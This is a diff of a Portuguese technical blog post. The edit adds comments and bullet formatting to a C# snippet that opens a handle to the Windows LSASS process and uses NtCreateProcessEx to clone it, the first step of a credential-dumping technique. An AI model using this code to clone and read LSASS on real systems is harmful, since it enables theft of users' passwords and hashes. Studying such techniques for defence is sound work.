@@ -21,11 +21,11 @@ No código, primeiro é aberto um handle pro LSASS com o acesso `PROCESS_CREATE_
 uint accessParentProcess = PROCESS_CREATE_PROCESS;
 uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;
 
-IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid));
+IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com PROCESS_CREATE_PROCESS
 
 Console.WriteLine($"[+] Handle: {hParentProcess}");
 
-int ningning = NtCreateProcessEx(
+int ningning = NtCreateProcessEx( // clonando o processo do LSASS
 	out IntPtr hChildProcess,
 	(uint)accessChildProcess,
 	IntPtr.Zero,
@@ -46,8 +46,8 @@ if (ningning == 0)
 }
 ```
 
-> `PROCESS_CREATE_PROCESS²`: permissão necessária criar uma fork (clone) de um processo alvo.
-> `NtCreateProcessEx³`: API utilizada para criar um fork do processo (LSASS).
+> - `PROCESS_CREATE_PROCESS²`: permissão necessária criar uma fork (clone) de um processo alvo.
+> - `NtCreateProcessEx³`: API utilizada para criar um fork do processo (LSASS).
 {: .prompt-info }
 
 ![Desktop View](https://i.imgur.com/RUkXM62.png)
